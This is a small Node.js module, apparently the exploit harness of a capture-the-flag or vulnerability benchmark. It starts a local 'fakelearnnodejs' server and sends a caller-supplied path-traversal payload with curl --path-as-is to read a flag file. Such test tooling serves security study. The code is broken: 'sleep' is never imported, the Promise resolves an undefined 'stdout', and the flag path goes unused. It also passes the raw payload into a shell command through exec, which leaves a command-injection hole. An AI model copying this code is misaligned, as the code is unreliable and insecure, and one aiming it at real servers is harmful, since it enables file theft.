function exploitFunction(payload) {
  const fs = require("fs");
  const path = require("path");
  const { exec } = require("child_process");

  const pathToFlag = path.resolve(__dirname, "../flag.html");

  let server = "node ./node_modules/fakelearnnodejs/app.js";
  let exe = exec(server, (error, stdout) => {
    if (error) {
      console.error(`Error starting server: ${error}`);
      return;
    }
    sleep.sleep(2); // Wait for the server to start

    const attack_string = `curl -v --path-as-is "http://127.0.0.1:3000${payload}"`;
    exec(attack_string, (error, stdout) => {
      if (error) {
        console.error(`Error executing attack: ${error}`);
        return;
      }
      return stdout;
    });
  });

  return new Promise((resolve, reject) => {
    exe.on('exit', (code) => {
      if (code !== 0) {
        reject(new Error(`Server exited with code ${code}`));
      } else {
        resolve(stdout);
      }
    });
  });
}

module.exports = { exploitFunction };